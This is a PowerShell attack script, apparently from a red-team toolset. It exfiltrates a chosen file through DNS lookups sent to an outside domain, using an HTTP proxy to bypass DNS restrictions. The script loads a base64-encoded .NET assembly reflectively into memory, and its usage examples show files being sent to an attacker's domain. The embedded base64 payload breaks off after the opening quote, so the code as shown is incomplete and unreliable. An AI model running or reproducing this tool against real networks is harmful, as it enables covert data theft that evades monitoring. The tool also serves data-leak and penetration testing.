function Invoke-ReflectiveDNSExfiltrator
{
	<#
	.AUTHOR Arno0x0x, Twitter: @Arno0x0x
	
	.SYNOPSIS
	Invoke-ReflectiveDNSExfiltrator allows for transfering (exfiltrate) a file over a DNS resolution covert channel.
    This is basically a data leak testing tool allowing to exfiltrate some data over a covert channel.
	
	This tool addresses the specific case when the source computer from which you need/want to exfiltrate data cannot perform
	DNS resolution of external domain name (which is normally required in order to use the DNS resolution covert channel).
	
	The solution in this case is to use a third party device exposing a service which will have to resolve a domain name on behalf
	of the source computer. The perfect, and most basic example, is to use a HTTP proxy server and feed it with some HEAD requests
	for all the external domain names. It does not matter whether or not the HEAD request gets a proper HTTP response, we really don't care,
	as long as the proxy first has to resolve the domain name, hence allowing for data exfiltration.
	
    It requires the server side counterpart coded in Python: reflectiveDnsExfiltrator.py.

	.EXAMPLE
    # Default usage, no options:
	PS C:\> Invoke-ReflectiveDNSExfiltrator -i anyFile -d mydomain.com -p password -s proxyName:proxyPort

	# Setting a 500ms throttling time
    PS C:\> Invoke-ReflectiveDNSExfiltrator -i anyFile -d mydomain.com -p password -s proxyName:proxyPort -t 500

	# Limiting the DNS request size to a maximum of 150 bytes
    PS C:\> Invoke-ReflectiveDNSExfiltrator -i anyFile -d mydomain.com -p password -s proxyName:proxyPort -r 150
	
	# Limiting the label size to a maximum of 40 characters
    PS C:\> Invoke-ReflectiveDNSExfiltrator -i anyFile -d mydomain.com -p password -s proxyName:proxyPort -l 40
	
	#>
	
	[CmdletBinding()]
		Param (

		[Parameter(Mandatory = $True)]
		[Alias('i')]
    	[ValidateNotNullOrEmpty()]
    	[String]$InputFile,
		
    	[Parameter(Mandatory = $True)]
		[Alias('d')]
    	[ValidateNotNullOrEmpty()]
    	[String]$DomainName,

		[Parameter(Mandatory = $True)]
		[Alias('p')]
    	[ValidateNotNullOrEmpty()]
    	[String]$Password,
		
        [Parameter(Mandatory = $True)]
		[Alias('s')]
		[ValidateNotNullOrEmpty()]
        [String]$ProxyServer,
		
		[Parameter(Mandatory = $False)]
		[Alias('t')]
		[ValidateNotNullOrEmpty()]
        [int]$ThrottleTime,
		
		[Parameter(Mandatory = $False)]
		[Alias('r')]
		[ValidateNotNullOrEmpty()]
        [int]$RequestMaxSize,
		
		[Parameter(Mandatory = $False)]
		[Alias('l')]
		[ValidateNotNullOrEmpty()]
        [int]$LabelMaxSize
    )
	
	# Load the DNSExfiltrator assembly
	$DNSExfiltratorLib = [System.Convert]::FromBase64String("
	[System.Reflection.Assembly]::Load($DNSExfiltratorLib) | Out-Null
	
	# Prepare arguments
	$Args = [System.Collections.ArrayList]@()
	$Args.Add($InputFile) | Out-Null
	$Args.Add($DomainName)  | Out-Null
	$Args.Add($Password)  | Out-Null
	$Args.Add($ProxyServer)  | Out-Null
	
	if ($ThrottleTime) {
		$Args.Add("t=$ThrottleTime") | Out-Null
	}
	if ($RequestMaxSize) {
		$Args.Add("r=$RequestMaxSize") | Out-Null
	}
	if ($LabelMaxSize) {
		$Args.Add("l=$LabelMaxSize") | Out-Null
	}
	
	# Invoke the Main entry point
	[ReflectiveDnsExfiltrator.ReflectiveDnsExfiltrator]::Main($Args)
}